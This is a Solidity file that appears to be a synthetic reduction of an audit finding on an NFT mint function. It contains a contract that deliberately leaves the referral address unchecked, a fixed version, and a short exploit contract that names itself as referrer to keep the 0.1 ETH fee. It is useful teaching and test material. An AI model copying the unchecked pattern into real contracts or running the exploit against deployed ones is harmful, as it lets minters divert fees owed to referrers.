// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Heurist ZkImagine.mint — referral address is not validated
    (Zokyo, 2024-07-01 Heurist, high).

    SYNTHETIC, cheatcode-free reduction. The mint fee is 1 ETH. Ten percent,
    0.1 ETH, is the referral fee. mint forwards that fee to whatever address
    the caller passes, including the caller. The minter names themselves and
    keeps the 0.1 ETH. The real referrer is paid nothing.
    The control rejects address(0) and the caller, and pays an authorized
    referrer the same 0.1 ETH. */

contract Nft {
    uint256 public constant MINT_FEE = 1 ether;
    uint256 public constant REFERRAL_FEE = 0.1 ether;

    mapping(address => bool) public authorized;
    mapping(address => uint256) public minted;
    address public realReferrer;

    constructor(address realReferrer_) {
        realReferrer = realReferrer_;
        authorized[realReferrer_] = true;
    }

    function mint(address referral) external payable virtual {
        require(msg.value == MINT_FEE, "fee");
        // @> VULN: referral is not checked, so the minter can pass their own address
        (bool ok,) = referral.call{value: REFERRAL_FEE}("");
        require(ok, "pay");
        minted[msg.sender] += 1;
    }
}

contract NftFixed is Nft {
    constructor(address realReferrer_) Nft(realReferrer_) {}

    function mint(address referral) external payable override {
        require(msg.value == MINT_FEE, "fee");
        require(referral != address(0) && referral != msg.sender, "referral");
        require(authorized[referral], "authorized");
        (bool ok,) = referral.call{value: REFERRAL_FEE}("");
        require(ok, "pay");
        minted[msg.sender] += 1;
    }
}

contract Exploit {
    address public constant REAL = 0x3333333333333333333333333333333333333333;
    uint256 public constant FEE = 0.1 ether;

    Nft public nft;

    constructor() {
        nft = new Nft(REAL);
    }

    receive() external payable {}

    function run() external payable {
        require(msg.value == 1 ether, "value");
        nft.mint{value: msg.value}(address(this));
        require(address(this).balance == FEE, "fee");
        require(REAL.balance == 0, "real");
        require(nft.minted(address(this)) == 1, "minted");
        require(address(nft).balance == 1 ether - FEE, "pot");
    }
}
